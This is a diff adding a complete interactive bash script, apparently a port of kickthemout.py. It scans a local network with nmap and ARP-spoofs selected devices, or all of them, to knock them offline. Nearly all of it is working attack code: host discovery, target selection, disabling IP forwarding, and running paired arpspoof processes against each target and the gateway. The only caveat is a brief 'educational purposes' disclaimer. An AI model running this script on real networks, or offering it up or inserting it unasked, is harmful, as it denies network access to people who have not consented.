@@ -1,0 +1,352 @@
+#!/bin/bash
+
+# A bash script to kick devices off your network.
+# This script is a bash equivalent of the original kickthemout.py script.
+# It performs ARP spoofing attacks to deny network access to one, some, or all devices
+# on the local network. It is designed to be interactive, robust, and safe.
+# This script is a sophisticated, interactive, and feature-rich Bash utility designed to mirror and expand upon the functionality of the original kickthemout.py tool. Its core
+# purpose is to discover devices on a local area network and execute ARP spoofing attacks to deny network access to specific targets, with multiple levels of user control and safety checks.
+
+# Dependencies: nmap, arpspoof (from dsniff package)
+
+# Root Enforcement:
+# This block ensures the script is always run with root privileges, which are
+# necessary for network operations like ARP spoofing and modifying IP forwarding.
+# If not run as root, it will automatically attempt to re-execute itself using sudo.
+if [ "$EUID" -ne 0 ]; then
+	echo -e "\e[1;48;5;202m" "Please run as root or with sudo" "\e[0m"
+	sudo "$0" # Re-run the script with sudo
+	exit 1
+fi
+
+# --- Functions ---
+
+# check_dependencies:
+# Verifies that all necessary external tools (nmap and arpspoof=from dsniff package) are installed
+# and available in the system's PATH. Exits with an error if any dependency
+# is missing, guiding the user to install them.
+check_dependencies() {
+	echo "Checking for dependencies..."
+	for cmd in nmap arpspoof; do
+		if ! command -v "$cmd" &>/dev/null; then
+			echo "Error: $cmd is not installed. Please install it to continue."
+			exit 1
+		fi
+	done
+	echo "Dependencies are satisfied."
+}
+
+# get_gateway_ip_for_interface:
+# Retrieves the IP address of the default gateway for a *specific* network interface.
+# This is crucial in environments with multiple network interfaces, ensuring the
+# correct gateway is targeted for the chosen interface.
+# Arguments: $1 = Interface name (e.g., eth0, wlan0)
+get_gateway_ip_for_interface() {
+	ip -o -4 route show to default dev "$1" | awk '{print $3}'
+}
+
+# scan_network:
+# Performs a network scan using nmap to discover active hosts on a given network range.
+# It uses a "ping scan" (-sn) for speed and extracts both IP and MAC addresses
+# of responsive devices for easier identification by the user.
+# Arguments: $1 = Network range in CIDR notation (e.g., 192.168.1.0/24)
+scan_network() {
+	local network_range=$1
+	nmap -sn "$network_range" -oG - | awk '/Up$/{print $2" "$3}'
+}
+
+# start_attack:
+# Initiates the ARP spoofing attack on one or more target IP addresses.
+# This function is responsible for critical setup and execution:
+# 1. Manages IP forwarding to ensure a denial-of-service attack.
+# 2. Launches multiple arpspoof processes in the background.
+# 3. Sets up a trap to gracefully stop the attack upon Ctrl+C.
+# Arguments: $1 = Gateway IP, $2 = Interface, $3+ = Target IP(s)
+start_attack() {
+	local gateway_ip=$1
+	local interface=$2
+	shift 2 # Shift parameters to access targets array easily
+	local targets=("$@")
+
+	arpspoof_pids=() # Array to store PIDs of background arpspoof processes
+
+	echo "Starting ARP spoofing attack on " "${targets[@]}"
+	echo "Press Ctrl+C to stop the attack."
+
+	# IP Forwarding Management:
+	# Temporarily disable IP forwarding to prevent the attacker's machine
+	# from routing traffic for the victim. This ensures the attack acts
+	# as a denial-of-service (kicking off) rather than a Man-in-the-Middle.
+	original_ip_forward=$(cat /proc/sys/net/ipv4/ip_forward)
+	echo 0 >/proc/sys/net/ipv4/ip_forward
+
+	# Trap for graceful shutdown:
+	# Ensures the stop_attack function is called to clean up processes
+	# and restore network settings if the script is interrupted.
+	trap 'stop_attack; exit' SIGINT
+
+	# Launch arpspoof processes for each target:
+	# Two arpspoof commands are run per target to poison both the target's
+	# and the gateway's ARP caches, effectively isolating the target.
+	for target_ip in "${targets[@]}"; do
+		arpspoof -i "$interface" -t "$target_ip" "$gateway_ip" &
+		arpspoof_pids+=($!) # Store PID of the first arpspoof process
+		arpspoof -i "$interface" -t "$gateway_ip" "$target_ip" &
+		arpspoof_pids+=($!) # Store PID of the second arpspoof process
+	done
+
+	# Wait for arpspoof processes to finish (they run indefinitely until killed)
+	for pid in "${arpspoof_pids[@]}"; do
+		wait "$pid" # This will pause until the PIDs are terminated by stop_attack
+	done
+}
+
+# stop_attack:
+# Cleans up after the ARP spoofing attack, ensuring no lingering processes
+# and restoring the system's network configuration.
+# This function is called by the SIGINT trap upon script interruption.
+stop_attack() {
+	echo "Stopping ARP spoofing attack and restoring network..."
+	# Kill all background arpspoof processes that were launched.
+	for pid in "${arpspoof_pids[@]}"; do
+		kill "$pid" 2>/dev/null # Suppress error if process already died
+	done
+
+	# Restore IP Forwarding:
+	# Reverts the IP forwarding setting to its original value, ensuring the
+	# system's routing behavior returns to normal after the attack.
+	echo "$original_ip_forward" >/proc/sys/net/ipv4/ip_forward
+
+	echo "Attack stopped."
+}
+
+# get_local_ip:
+# Determines the local IP address of the machine for a specified network interface.
+# This is used for self-exclusion in the 'kick all' mode to prevent the script
+# from attacking its own host.
+# Arguments: $1 = Interface name (e.g., eth0, wlan0)
+get_local_ip() {
+	ip -o -4 addr show dev "$1" | awk '{print $4}' | cut -d/ -f1
+}
+
+# display_help:
+# Shows detailed information about the script, including its purpose, usage,
+# dependencies, attack modes, and a disclaimer. It pauses for user input
+# and clears the screen to improve readability and user experience.
+display_help() {
+	echo "
+KickThemOut Bash Script - Help & About
+
+Purpose:
+  This script is a Bash equivalent of the original kickthemout.py tool.
+  It performs ARP spoofing attacks to deny network access to one, some,
+  or all selected devices on your local network.
+
+Usage:
+  Run the script with root privileges:
+    sudo ./kickthemout.sh
+
+Dependencies:
+  - nmap: For network host discovery.
+  - arpspoof (from dsniff package): For executing ARP spoofing attacks.
+  - iproute2 (ip command): For network interface and routing information.
+  - Standard Linux utilities: awk, sed, sort, wc, head, cut, nl.
+
+Attack Modes:
+  1) Kick ONE Off: Target a single device from the scanned list.
+  2) Kick SOME Off: Target multiple devices by providing a comma-separated list of numbers.
+  3) Kick ALL Off: Target all devices on the network, automatically excluding
+     the gateway and your machine. You will also be prompted to exclude
+     additional specific targets by number.
+
+Important Notes:
+  - This script must be run with 'sudo'.
+  - IP forwarding is temporarily disabled during the attack and restored afterwards.
+  - Press Ctrl+C at any time during an attack to stop it gracefully.
+
+Disclaimer:
+  This tool is provided for educational purposes ONLY. Use it responsibly
+  and ethically. The authors are not responsible for any misuse or damage.
+"
+
+	read -r -s -p "press ENTER to continue" # Pause execution until user presses Enter
+	clear                                   # Clear the screen for a cleaner transition
+}
+
+# --- Attack Modes ---
+# These functions provide the main interactive modes for the user to select targets.
+
+# kickoneoff:
+# Guides the user to select a single target from the scanned host list
+# and initiates the ARP spoofing attack against only that device.
+kickoneoff() {
+	echo -n "Enter the number of the host to kick off: "
+	read -r choice
+
+	TARGET_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')
+
+	if [ -z "$TARGET_IP" ]; then
+		echo "Invalid selection."
+		exit 1
+	fi
+
+	start_attack "$GATEWAY_IP" "$INTERFACE" "$TARGET_IP"
+}
+
+# kicksomeoff:
+# Allows the user to specify multiple targets by entering a comma-separated
+# list of numbers corresponding to the hosts in the scanned list.
+kicksomeoff() {
+	echo -n "Enter the numbers of the hosts to kick off (comma-separated): "
+	read -r choices
+
+	TARGET_IPS=()
+	IFS=',' read -ra ADDR <<<"$choices"
+	for choice in "${ADDR[@]}"; do
+		TARGET_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')
+		if [ -z "$TARGET_IP" ]; then
+			echo "Invalid selection: $choice."
+		else
+			TARGET_IPS+=("$TARGET_IP")
+		fi
+	done
+
+	if [ ${#TARGET_IPS[@]} -eq 0 ]; then
+		echo "No valid targets selected."
+		exit 1
+	fi
+
+	start_attack "$GATEWAY_IP" "$INTERFACE" "${TARGET_IPS[@]}"
+}
+
+# kickalloff:
+# Targets all devices on the network for ARP spoofing, with intelligent
+# exclusions. It automatically avoids the gateway and the local machine,
+# and offers an interactive prompt for the user to specify additional
+# exclusions by host number.
+kickalloff() {
+	LOCAL_IP=$(get_local_ip "$INTERFACE")
+	# EXCLUDED_IPS acts as a pipe-separated string for efficient lookup with grep.
+	EXCLUDED_IPS="|$GATEWAY_IP|$LOCAL_IP|"
+
+	echo "Kicking off all devices except gateway ($GATEWAY_IP) and this machine ($LOCAL_IP)..."
+	read -r -p "Do you want to exclude any other targets? (y/n): " exclude_choice
+	if [[ "$exclude_choice" == "y" || "$exclude_choice" == "Y" ]]; then
+		read -r -p "Enter the numbers of the hosts to exclude (comma-separated): " exclude_numbers
+		IFS=',' read -ra ADDR <<<"$exclude_numbers"
+		for choice in "${ADDR[@]}"; do
+			# Resolve the chosen number to an IP address from the HOSTS list
+			EXCLUDED_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')
+			if [ -n "$EXCLUDED_IP" ]; then
+				EXCLUDED_IPS="$EXCLUDED_IPS$EXCLUDED_IP|" # Add to the exclusion string
+			fi
+		done
+	fi
+
+	TARGET_IPS=()
+	while read -r line; do
+		ip=$(echo "$line" | awk '{print $1}') # Extract IP from the scanned line
+		# Check if the current IP is in the EXCLUDED_IPS string
+		if ! echo "$EXCLUDED_IPS" | grep -q "|$ip|"; then
+			TARGET_IPS+=("$ip") # Add to targets if not excluded
+		fi
+	done <<<"$HOSTS"
+
+	if [ ${#TARGET_IPS[@]} -eq 0 ]; then
+		echo "No other devices to kick off."
+		exit 1
+	fi
+
+	start_attack "$GATEWAY_IP" "$INTERFACE" "${TARGET_IPS[@]}"
+}
+
+# --- Main Script ---
+# This is the entry point and main control flow of the script.
+
+# Initial menu display and help check:
+# The menu is displayed first to allow quick access to help without
+# performing network operations, improving user experience.
+echo
+echo "Choose an attack mode:"
+echo "1) Kick one off"
+echo "2) Kick some off"
+echo "3) Kick all off"
+echo "4) Help/About"
+echo -n "Enter your choice: "
+read -r mode
+
+# Handle help request immediately
+[ "$mode" -eq 4 ] && display_help
+
+check_dependencies # Ensure all required tools are present before proceeding.
+
+# Interface Detection and Selection:
+# Dynamically identifies all active (UP) network interfaces (excluding loopback).
+# If multiple are found, it provides an interactive menu for the user to choose.
+interfaces=$(ip -br link | awk '$2 == "UP" {print $1}' | grep -v '^lo$')
+num_interfaces=$(echo "$interfaces" | wc -l)
+
+if [ "$num_interfaces" -eq 0 ]; then
+	echo "Error: No active network interfaces found. Please ensure at least one interface is UP."
+	exit 1
+elif [ "$num_interfaces" -eq 1 ]; then
+	INTERFACE=$interfaces
+	echo "Using network interface: $INTERFACE"
+else
+	echo "Multiple network interfaces found. Please choose one:"
+	select interface in $interfaces; do
+		if [ -n "$interface" ]; then
+			INTERFACE=$interface
+			echo "You have selected interface: $INTERFACE"
+			break # Exit select loop once a valid choice is made
+		else
+			echo "Invalid selection. Please try again."
+		fi
+	done
+fi
+
+GATEWAY_IP=$(get_gateway_ip_for_interface "$INTERFACE") # Get gateway for the chosen interface
+
+if [ -z "$INTERFACE" ] || [ -z "$GATEWAY_IP" ]; then
+	echo "Error: Could not determine network interface or gateway IP."
+	exit 1
+fi
+
+echo "Gateway IP: $GATEWAY_IP"
+
+# Determine network range for scanning:
+# Derives the /24 network range from the identified gateway IP.
+NETWORK_RANGE=$(echo "$GATEWAY_IP" | cut -d. -f1-3).0/24
+
+echo "Scanning the network for hosts..."
+HOSTS=$(scan_network "$NETWORK_RANGE") # Perform the actual network scan
+
+if [ -z "$HOSTS" ]; then
+	echo "No hosts found on the network."
+	exit 0
+fi
+
+echo "Available hosts:"
+echo "$HOSTS" | nl # Display the numbered list of discovered hosts
+
+# Execute the chosen attack mode after all necessary information is gathered.
+case "$mode" in
+1)
+	kickoneoff
+	;;
+2)
+	kicksomeoff
+	;;
+3)
+	kickalloff
+	;;
+*)
+	# If help was chosen earlier, this case will be hit but display_help
+	# already executed, so we just exit if the mode was 4. Otherwise, it's
+	# an invalid mode, which should not happen if the earlier select is used.
+	if [ "$mode" -ne 4 ]; then
+		echo "Invalid choice. This should not happen."
+		exit 1
+	fi
+	;;
+esac
